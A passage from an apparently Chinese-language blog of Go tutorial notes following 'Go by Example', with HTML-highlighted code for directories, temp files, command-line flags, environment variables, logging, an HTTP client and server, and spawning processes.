&#123;  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot; &quot;</span>, entry<span class="hljs-selector-class">.Name</span>(), entry<span class="hljs-selector-class">.IsDir</span>())  <br>    &#125;  <br>  <br>    err = os<span class="hljs-selector-class">.Chdir</span>(<span class="hljs-string">&quot;subdir/parent/child&quot;</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>  <br>    c, err = os<span class="hljs-selector-class">.ReadDir</span>(<span class="hljs-string">&quot;.&quot;</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;Listing subdir/parent/child&quot;</span>)  <br>    <span class="hljs-keyword">for</span> _, entry := range c &#123;  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot; &quot;</span>, entry<span class="hljs-selector-class">.Name</span>(), entry<span class="hljs-selector-class">.IsDir</span>())  <br>    &#125;  <br>  <br>    err = os<span class="hljs-selector-class">.Chdir</span>(<span class="hljs-string">&quot;../../..&quot;</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;Visiting subdir&quot;</span>)  <br>    err = filepath<span class="hljs-selector-class">.WalkDir</span>(<span class="hljs-string">&quot;subdir&quot;</span>, visit)  <br>&#125;  <br>  <br>func <span class="hljs-built_in">visit</span>(<span class="hljs-selector-tag">path</span> string, d fs<span class="hljs-selector-class">.DirEntry</span>, err error) error &#123;  <br>    <span class="hljs-keyword">if</span> err != nil &#123;  <br>       return err  <br>    &#125;  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-selector-tag">path</span>, d<span class="hljs-selector-class">.IsDir</span>())  <br>    return nil  <br>&#125;<br></code></pre></td></tr></table></figure><p>os.RemoveAll–&gt;rm -rf<br>os.MkdirAll–&gt;mkdir -p<br>os.Chdir–&gt;cd</p><h2 id="Temporary-Files-and-Directories"><a href="#Temporary-Files-and-Directories" class="headerlink" title="Temporary Files and Directories"></a>Temporary Files and Directories</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;os&quot;</span>    <span class="hljs-string">&quot;path/filepath&quot;</span>)  <br>  <br>func <span class="hljs-built_in">check</span>(e error) &#123;  <br>    <span class="hljs-keyword">if</span> e != nil &#123;  <br>       <span class="hljs-built_in">panic</span>(e)  <br>    &#125;  <br>&#125;  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    f, err := os<span class="hljs-selector-class">.CreateTemp</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;sample&quot;</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;Temp file name:&quot;</span>, f<span class="hljs-selector-class">.Name</span>())  <br>    defer os<span class="hljs-selector-class">.Remove</span>(f<span class="hljs-selector-class">.Name</span>())  <br>  <br>    _, err = f<span class="hljs-selector-class">.Write</span>(<span class="hljs-selector-attr">[]</span><span class="hljs-built_in">byte</span>(<span class="hljs-string">&quot;testfile&quot;</span>))  <br>    <span class="hljs-built_in">check</span>(err)  <br>  <br>    dname, err := os<span class="hljs-selector-class">.MkdirTemp</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;sampledir&quot;</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;Temp dir name:&quot;</span>, dname)  <br>  <br>    defer os<span class="hljs-selector-class">.RemoveAll</span>(dname)  <br>    fname := filepath<span class="hljs-selector-class">.Join</span>(dname, <span class="hljs-string">&quot;file1&quot;</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(fname)  <br>    err = os<span class="hljs-selector-class">.WriteFile</span>(fname, <span class="hljs-selector-attr">[]</span>byte&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;, <span class="hljs-number">0644</span>)  <br>    <span class="hljs-built_in">check</span>(err)  <br>&#125;<br></code></pre></td></tr></table></figure><p>通过 os.CreateTemp 在操作系统默认位置创建临时文件。</p><h2 id="Command-Line-Arguments"><a href="#Command-Line-Arguments" class="headerlink" title="Command-Line Arguments"></a>Command-Line Arguments</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;os&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    argswithprog := os<span class="hljs-selector-class">.Args</span>  <br>    argswithoutprog := os<span class="hljs-selector-class">.Args</span><span class="hljs-selector-attr">[1:]</span>  <br>    arg := os<span class="hljs-selector-class">.Args</span><span class="hljs-selector-attr">[3]</span>  <br>    fmt<span class="hljs-selector-class">.Println</span>(argswithprog)  <br>    fmt<span class="hljs-selector-class">.Println</span>(argswithoutprog)  <br>    fmt<span class="hljs-selector-class">.Println</span>(arg)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Command-Line-Flags"><a href="#Command-Line-Flags" class="headerlink" title="Command-Line Flags"></a>Command-Line Flags</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;flag&quot;</span>  <br>    <span class="hljs-string">&quot;fmt&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    wordPtr := flag<span class="hljs-selector-class">.String</span>(<span class="hljs-string">&quot;word&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;a string&quot;</span>)  <br>    numPtr := flag<span class="hljs-selector-class">.Int</span>(<span class="hljs-string">&quot;num&quot;</span>, <span class="hljs-number">42</span>, <span class="hljs-string">&quot;an int&quot;</span>)  <br>    forkPtr := flag<span class="hljs-selector-class">.Bool</span>(<span class="hljs-string">&quot;fork&quot;</span>, false, <span class="hljs-string">&quot;a bool&quot;</span>)  <br>    <span class="hljs-selector-tag">var</span> svar string  <br>    flag<span class="hljs-selector-class">.StringVar</span>(&amp;svar, <span class="hljs-string">&quot;svar&quot;</span>, <span class="hljs-string">&quot;bar&quot;</span>, <span class="hljs-string">&quot;a string var&quot;</span>)  <br>  <br>    flag<span class="hljs-selector-class">.Parse</span>()  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;word:&quot;</span>, *wordPtr)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;numb:&quot;</span>, *numPtr)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;fork:&quot;</span>, *forkPtr)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;svar:&quot;</span>, svar)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;tail:&quot;</span>, flag<span class="hljs-selector-class">.Args</span>())  <br>&#125;<br></code></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">PS</span> <span class="hljs-string">C:\Users\Ry4n\Desktop\golang\gobyexample&gt;</span> <span class="hljs-string">.\CmdFlags.exe</span><br><span class="hljs-attr">word:</span> <span class="hljs-string">foo</span><br><span class="hljs-attr">numb:</span> <span class="hljs-number">42</span><br><span class="hljs-attr">fork:</span> <span class="hljs-literal">false</span><br><span class="hljs-attr">svar:</span> <span class="hljs-string">bar</span><br><span class="hljs-attr">tail:</span> []<br><span class="hljs-string">PS</span> <span class="hljs-string">C:\Users\Ry4n\Desktop\golang\gobyexample&gt;</span> <span class="hljs-string">.\CmdFlags.exe</span> <span class="hljs-string">-word</span> <span class="hljs-string">abc</span><br><span class="hljs-attr">word:</span> <span class="hljs-string">abc</span><br><span class="hljs-attr">numb:</span> <span class="hljs-number">42</span><br><span class="hljs-attr">fork:</span> <span class="hljs-literal">false</span><br><span class="hljs-attr">svar:</span> <span class="hljs-string">bar</span><br><span class="hljs-attr">tail:</span> []<br><span class="hljs-string">PS</span> <span class="hljs-string">C:\Users\Ry4n\Desktop\golang\gobyexample&gt;</span> <span class="hljs-string">.\CmdFlags.exe</span> <span class="hljs-string">-word</span> <span class="hljs-string">abc</span> <span class="hljs-string">-fork</span><br><span class="hljs-attr">word:</span> <span class="hljs-string">abc</span><br><span class="hljs-attr">numb:</span> <span class="hljs-number">42</span><br><span class="hljs-attr">fork:</span> <span class="hljs-literal">true</span><br><span class="hljs-attr">svar:</span> <span class="hljs-string">bar</span><br><span class="hljs-attr">tail:</span> []<br></code></pre></td></tr></table></figure><p>另外，-h 会获取自动生成的帮助文本内容</p><h2 id="Command-Line-Subcommands"><a href="#Command-Line-Subcommands" class="headerlink" title="Command-Line Subcommands"></a>Command-Line Subcommands</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;flag&quot;</span>  <br>    <span class="hljs-string">&quot;fmt&quot;</span>    <span class="hljs-string">&quot;os&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    fooCmd := flag<span class="hljs-selector-class">.NewFlagSet</span>(<span class="hljs-string">&quot;foo&quot;</span>, flag.ExitOnError)  <br>    fooEnable := fooCmd<span class="hljs-selector-class">.Bool</span>(<span class="hljs-string">&quot;enable&quot;</span>, false, <span class="hljs-string">&quot;enable&quot;</span>)  <br>    fooName := fooCmd<span class="hljs-selector-class">.String</span>(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>)  <br>  <br>    barCmd := flag<span class="hljs-selector-class">.NewFlagSet</span>(<span class="hljs-string">&quot;bar&quot;</span>, flag.ExitOnError)  <br>    barLevel := barCmd<span class="hljs-selector-class">.Int</span>(<span class="hljs-string">&quot;level&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;level&quot;</span>)  <br>  <br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(os.Args) &lt; <span class="hljs-number">2</span> &#123;  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;expect &#x27;foo&#x27; or &#x27;bar&#x27; subcommands&quot;</span>)  <br>       os<span class="hljs-selector-class">.Exit</span>(<span class="hljs-number">1</span>)  <br>    &#125;  <br>    <span class="hljs-selector-tag">switch</span> os<span class="hljs-selector-class">.Args</span><span class="hljs-selector-attr">[1]</span> &#123;  <br>    case <span class="hljs-string">&quot;foo&quot;</span>:  <br>       fooCmd<span class="hljs-selector-class">.Parse</span>(os<span class="hljs-selector-class">.Args</span><span class="hljs-selector-attr">[2:]</span>)  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;subcommand &#x27;foo&#x27;&quot;</span>)  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;  enable:&quot;</span>, *fooEnable)  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;  name:&quot;</span>, *fooName)  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;  tail:&quot;</span>, fooCmd<span class="hljs-selector-class">.Args</span>())  <br>    case <span class="hljs-string">&quot;bar&quot;</span>:  <br>       barCmd<span class="hljs-selector-class">.Parse</span>(os<span class="hljs-selector-class">.Args</span><span class="hljs-selector-attr">[2:]</span>)  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;subcommand &#x27;bar&#x27;&quot;</span>)  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;  level:&quot;</span>, *barLevel)  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;  tail:&quot;</span>, barCmd<span class="hljs-selector-class">.Args</span>())  <br>    default:  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;expected &#x27;foo&#x27; or &#x27;bar&#x27; subcommands&quot;</span>)  <br>       os<span class="hljs-selector-class">.Exit</span>(<span class="hljs-number">1</span>)  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Environment-Variables"><a href="#Environment-Variables" class="headerlink" title="Environment Variables"></a>Environment Variables</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;os&quot;</span>    <span class="hljs-string">&quot;strings&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    os<span class="hljs-selector-class">.Setenv</span>(<span class="hljs-string">&quot;FOO&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;FOO:&quot;</span>, os<span class="hljs-selector-class">.Getenv</span>(<span class="hljs-string">&quot;FOO&quot;</span>))  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;WQW:&quot;</span>, os<span class="hljs-selector-class">.Getenv</span>(<span class="hljs-string">&quot;WQW&quot;</span>))  <br>    fmt<span class="hljs-selector-class">.Println</span>()  <br>    <span class="hljs-keyword">for</span> _, e := range os<span class="hljs-selector-class">.Environ</span>() &#123;  <br>       pair := strings<span class="hljs-selector-class">.SplitN</span>(e, <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">2</span>)  <br>       fmt<span class="hljs-selector-class">.Println</span>(pair<span class="hljs-selector-attr">[0]</span>, <span class="hljs-string">&quot; &quot;</span>, pair<span class="hljs-selector-attr">[1]</span>)  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Logging"><a href="#Logging" class="headerlink" title="Logging"></a>Logging</h2><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs lasso">package main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;bytes&quot;</span>  <br>    <span class="hljs-string">&quot;fmt&quot;</span>    <span class="hljs-string">&quot;log&quot;</span>    <span class="hljs-string">&quot;os&quot;</span>)  <br>  <br>func main() &#123;  <br>  <br>    <span class="hljs-keyword">log</span>.Println(<span class="hljs-string">&quot;standard logger&quot;</span>)  <br>  <br>    <span class="hljs-keyword">log</span>.SetFlags(<span class="hljs-keyword">log</span>.LstdFlags | <span class="hljs-keyword">log</span>.Lmicroseconds)  <br>    <span class="hljs-keyword">log</span>.Println(<span class="hljs-string">&quot;with micro&quot;</span>)  <br>  <br>    <span class="hljs-keyword">log</span>.SetFlags(<span class="hljs-keyword">log</span>.LstdFlags | <span class="hljs-keyword">log</span>.Lshortfile)  <br>    <span class="hljs-keyword">log</span>.Println(<span class="hljs-string">&quot;with file/line&quot;</span>)  <br>  <br>    mylog := <span class="hljs-keyword">log</span>.<span class="hljs-literal">New</span>(os.Stdout, <span class="hljs-string">&quot;my:&quot;</span>, <span class="hljs-keyword">log</span>.LstdFlags)  <br>    mylog.Println(<span class="hljs-string">&quot;from mylog&quot;</span>)  <br>  <br>    mylog.SetPrefix(<span class="hljs-string">&quot;ohmy:&quot;</span>)  <br>    mylog.Println(<span class="hljs-string">&quot;from mylog&quot;</span>)  <br>  <br>    <span class="hljs-built_in">var</span> buf <span class="hljs-built_in">bytes</span>.Buffer  <br>    buflog := <span class="hljs-keyword">log</span>.<span class="hljs-literal">New</span>(&amp;buf, <span class="hljs-string">&quot;buf:&quot;</span>, <span class="hljs-keyword">log</span>.LstdFlags)  <br>  <br>    buflog.Println(<span class="hljs-string">&quot;hello&quot;</span>)  <br>  <br>    fmt.Print(<span class="hljs-string">&quot;from buflog:&quot;</span>, buf.<span class="hljs-built_in">String</span>())  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="HTTP-Client"><a href="#HTTP-Client" class="headerlink" title="HTTP Client"></a>HTTP Client</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;bufio&quot;</span>  <br>    <span class="hljs-string">&quot;fmt&quot;</span>    <span class="hljs-string">&quot;net/http&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    resp, err := http.Get(<span class="hljs-string">&quot;https://gobyexample.com&quot;</span>)  <br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;  <br>       <span class="hljs-built_in">panic</span>(err)  <br>    &#125;  <br>    <span class="hljs-keyword">defer</span> resp.Body.Close()  <br>  <br>    fmt.Println(<span class="hljs-string">&quot;status code&quot;</span>, resp.Status)  <br>    scanner := bufio.NewScanner(resp.Body)  <br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; scanner.Scan() &amp;&amp; i &lt; <span class="hljs-number">5</span>; i++ &#123;  <br>       fmt.Println(scanner.Text())  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="HTTP-Server"><a href="#HTTP-Server" class="headerlink" title="HTTP Server"></a>HTTP Server</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;net/http&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hello</span><span class="hljs-params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;  <br>    fmt.Fprintf(w, <span class="hljs-string">&quot;htllo\n&quot;</span>)  <br>  <br>&#125;  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">headers</span><span class="hljs-params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;  <br>    <span class="hljs-keyword">for</span> name, headers := <span class="hljs-keyword">range</span> req.Header &#123;  <br>       <span class="hljs-keyword">for</span> _, h := <span class="hljs-keyword">range</span> headers &#123;  <br>          fmt.Fprintf(w, <span class="hljs-string">&quot;%v:%v\n&quot;</span>, name, h)  <br>       &#125;  <br>    &#125;  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    http.HandleFunc(<span class="hljs-string">&quot;/hello&quot;</span>, hello)  <br>    http.HandleFunc(<span class="hljs-string">&quot;/headers&quot;</span>, headers)  <br>    http.ListenAndServe(<span class="hljs-string">&quot;:8090&quot;</span>, <span class="hljs-literal">nil</span>)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Spawning-Processes"><a href="#Spawning-Processes" class="headerlink" title="Spawning Processes"></a>Spawning Processes</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;io&quot;</span>    <span class="hljs-string">&quot;os/exec&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>  <br>    dateCmd := exec<span class="hljs-selector-class">.Command</span>(<span class="hljs-string">&quot;date&quot;</span>)  <br>  <br>    dateOut, err := dateCmd<span class="hljs-selector-class">.Output</span>()  <br>    <span class="hljs-keyword">if</span> err != nil &#123;  <br>       <span class="hljs-built_in">panic</span>(err)  <br>    &#125;  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;&gt; date&quot;</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-built_in">string</span>(dateOut))  <br>  <br>    _, err = exec<span class="hljs-selector-class">.Command</span>(<span class="hljs-string">&quot;date&quot;</span>, <span class="hljs-string">&quot;-x&quot;</span>)<span class="hljs-selector-class">.Output</span>()  <br>    <span class="hljs-keyword">if</span> err != nil &#123;  <br>       <span class="hljs-selector-tag">switch</span> e := err.(type) &#123;  <br>       case *exec<span class="hljs-selector-class">.Error</span>:  <br>          fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;failed executing:&quot;</span>, err)  <br>       case *exec<span class="hljs-selector-class">.ExitError</span>:  <br>          fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;command exit rc =&quot;</span>, e<span class="hljs-selector-class">.ExitCode</span>())  <br>       default:  <br>          <span class="hljs-built_in">panic</span>(err)  <br>       &#125;  <br>    &#125;  <br>  <br>    grepCmd := exec<span class="hljs-selector-class">.Command</span>(<span class="hljs-string">&quot;grep&quot;</span>, <span class="hljs-string">&quot;hello&quot;</span>)  <br>  <br>    grepIn, _ := grepCmd<span class="hljs-selector-class">.StdinPipe</span>()  <br>    grepOut, _ := grepCmd<span class="hljs-selector-class">.StdoutPipe</span>()  <br>    grepCmd<span class="hljs-selector-class">.Start</span>()  <br>    grepIn<span class="hljs-selector-class">.Write</span>(<span class="hljs-selector-attr">[]</span><span class="hljs-built_in">byte</span>(<span class="hljs-string">&quot;hello grep\ngoodbye grep&quot;</span>))  <br>    grepIn<span class="hljs-selector-class">.Close</span>()  <br>    grepBytes, _ := io<span class="hljs-selector-class">.ReadAll</span>(grepOut)  <br>    grepCmd<span class="hljs-selector-class">.Wait</span>()  <br>  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;&gt; grep hello&quot;</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-built_in">string</span>(grepBytes))  <br>  <br>    lsCmd := exec<span class="hljs-selector-class">.Command</span>(<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;ls -a -l -h&quot;</span>)  <br>    lsOut, err := lsCmd<span class="hljs-selector-class">.Output</span>()  <br>    <span class="hljs-keyword">if</span> err != nil &#123;  <br>       <span class="hljs-built_in">panic</span>(err)  <br>    &#125;  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;&gt; ls -a -l -h&quot;</span>)  <br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-built_in">string</span>(lsOut))  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Exec’ing-Processes"><a href="#Exec’ing-Processes" class="headerlink" title="Exec’ing Processes"></a>Exec’ing Processes</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;os&quot;</span>  <br>    <span class="hljs-string">&quot;os/exec&quot;</span>    <span class="hljs-string">&quot;syscall&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>  <br>    binary, lookErr := exec.LookPath(<span class="hljs-string">&quot;ls&quot;</span>)  